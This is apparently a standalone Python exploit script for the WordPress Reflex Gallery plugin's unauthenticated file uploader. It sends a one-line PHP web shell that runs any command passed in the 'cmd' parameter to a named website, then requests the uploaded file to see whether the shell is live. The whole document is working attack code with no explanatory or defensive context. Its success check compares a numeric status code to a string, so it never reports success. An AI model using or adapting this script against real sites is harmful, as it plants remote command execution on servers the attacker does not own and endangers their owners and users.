import requests

headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "null",
    "Content-Type": "multipart/form-data;",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
    "Connection": "close",
    "Content-Disposition": '''form-data; name="qqfile"; filename="class-min.php"''',
    "Content-Type": 'application/octet-stream'


}


body = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''

url = "http://renotahoedigs.com"
req = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2020&Month=11', headers=headers, data=body)
check_shell = requests.get(url+'/wp-content/uploads/2020/11/class-min.php')
if check_shell.status_code == '200':
    print("shell ok")
else:
    print("shell not ok")
